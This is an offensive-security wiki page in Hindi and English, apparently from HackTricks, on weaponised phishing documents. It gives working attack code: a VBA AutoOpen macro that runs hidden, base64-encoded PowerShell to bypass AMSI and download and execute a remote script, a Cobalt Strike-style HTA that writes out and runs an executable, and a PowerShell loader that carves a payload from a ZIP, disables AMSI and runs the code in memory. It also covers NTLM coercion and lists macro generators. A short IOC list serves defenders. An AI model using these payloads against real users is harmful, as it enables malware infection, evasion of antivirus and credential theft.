# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word किसी फ़ाइल को खोलने से पहले फ़ाइल डेटा का डेटा सत्यापन (data validation) करता है। डेटा सत्यापन डेटा संरचना की पहचान के रूप में OfficeOpenXML standard के विरुद्ध किया जाता है। यदि डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो जो फ़ाइल विश्लेषित की जा रही है वह नहीं खोली जाएगी।

आमतौर पर, macros वाली Word फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। हालाँकि, फ़ाइल का एक्सटेंशन बदलकर फ़ाइल का नाम बदलने पर भी उनकी macro execute करने की क्षमताएँ बनी रह सकती हैं.\
उदाहरण के लिए, एक RTF फ़ाइल डिज़ाइन के अनुसार macros को सपोर्ट नहीं करती, पर यदि एक DOCM फ़ाइल का नाम बदलकर RTF कर दिया जाए तो Microsoft Word उसे हैंडल करेगा और वह macro execution में सक्षम होगी.\
यही आंतरिक संरचनाएँ और तंत्र Microsoft Office Suite (Excel, PowerPoint etc.) के सभी सॉफ़्टवेयर पर लागू होते हैं।

You can use the following command to check which extensions are going to be executed by some Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
macros शामिल करने वाला रिमोट टेम्पलेट संदर्भित करने वाली DOCX फाइलें भी macros “execute” कर सकती हैं। 

### बाहरी इमेज लोड

जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

दस्तावेज़ से arbitrary code चलाने के लिए macros का उपयोग किया जा सकता है।

#### Autoload functions

जितने अधिक सामान्य वे होते हैं, AV द्वारा उनका पता लगने की संभावना उतनी ही अधिक होती है।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअली मेटाडेटा हटाएँ

**File > Info > Inspect Document > Inspect Document** पर जाएँ, जिससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें और फिर **Remove All** पर क्लिक करें जो **Document Properties and Personal Information** के पास है।

#### Doc एक्सटेंशन

समाप्त होने पर, **Save as type** ड्रॉपडाउन चुनें, फॉर्मेट को **`.docx`** से बदलकर **Word 97-2003 `.doc`** करें।\
ऐसा इसलिए करें क्योंकि आप **can't save macro's inside a `.docx`** और macro-enabled **`.docm`** एक्सटेंशन के आसपास एक **stigma** है (उदा. थंबनेल आइकन पर बड़ा `!` होता है और कुछ वेब/ईमेल गेटवे इन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए, यह **legacy `.doc` extension सबसे अच्छा compromise** है।

#### Malicious Macros जनरेटर

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फाइलें

HTA एक Windows प्रोग्राम है जो **HTML और scripting languages (such as VBScript and JScript)** को मिलाता है। यह यूजर इंटरफ़ेस जनरेट करता है और ब्राउज़र की सुरक्षा मॉडल की बाधाओं के बिना "fully trusted" एप्लिकेशन के रूप में execute होता है।

HTA को **`mshta.exe`** का उपयोग करके execute किया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** होता है, जिससे **`mshta` dependant on IE** बन जाता है। इसलिए अगर यह uninstall किया गया है, तो HTAs execute नहीं कर पाएँगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण मजबूर करना

NTLM प्रमाणीकरण को "remotely" मजबूर करने के कई तरीके हैं, उदाहरण के लिए, आप ईमेल या HTML में **अदृश्य छवियाँ** जोड़ सकते हैं जिन्हें उपयोगकर्ता एक्सेस करेगा (यहाँ तक कि HTTP MitM?). या शिकार को उन फ़ाइलों का **address** भेजें जो सिर्फ फ़ोल्डर खोलने भर से ही एक **authentication** को **trigger** कर दें।

**इन विचारों और और अधिक के लिए निम्न पृष्ठ देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

याद रखें कि आप सिर्फ hash या authentication चुरा ही नहीं सकते बल्कि **NTLM relay attacks** भी **perform** कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बहुत प्रभावी अभियान एक ऐसा ZIP भेजते हैं जिसमें दो वैध भ्रामक दस्तावेज़ (PDF/DOCX) और एक दुष्ट .lnk शामिल होता है। चाल यह है कि वास्तविक PowerShell loader ZIP के raw bytes में एक unique marker के बाद संग्रहीत होता है, और .lnk उसे carve करके पूरी तरह memory में चलाता है।

.slnk PowerShell one-liner द्वारा लागू किया गया सामान्य प्रवाह:

1) मूल ZIP को सामान्य पथों में ढूँढें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory का parent।
2) ZIP bytes पढ़ें और एक hardcoded marker खोजें (उदा., xFIQCV)। marker के बाद जो कुछ भी है वही embedded PowerShell payload है।
3) ZIP को %ProgramData% में कॉपी करें, वहाँ extract करें, और वैध दिखने के लिए decoy .docx खोलें।
4) current process के लिए AMSI को बायपास करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगले चरण का deobfuscate करें (उदा., सभी # वर्ण हटा दें) और उसे memory में execute करें।

एंबेडेड स्टेज को carve और चलाने के लिए उदाहरण PowerShell ढांचा:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
नोट्स
- Delivery अक्सर प्रतिष्ठित PaaS सबडोमेन्स (e.g., *.herokuapp.com) का दुरुपयोग करता है और payloads को gate कर सकता है (IP/UA के आधार पर benign ZIPs सर्व करता है)।
- अगला चरण अक्सर base64/XOR shellcode डिक्रिप्ट करता है और इसे Reflection.Emit + VirtualAlloc के माध्यम से execute करता है ताकि डिस्क आर्टिफैक्ट्स कम हों।

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control ताकि IE/Explorer या कोई भी app जो इसे embedding करता है payload को स्वतः पुनः लॉन्च कर दे। विवरण और ready-to-use commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसे ZIP files जिनमें ASCII marker string (e.g., xFIQCV) archive data के अंत में append की गई हो।
- .lnk जो parent/user folders को enumerate करता है ताकि ZIP locate कर सके और एक decoy document खोले।
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- लंबे समय तक चलने वाले business threads जो trusted PaaS domains पर host किए गए links पर समाप्त होते हैं।

## NTLM हैश चुराने के लिए Windows फ़ाइलें

इस पेज को देखें: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## संदर्भ

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
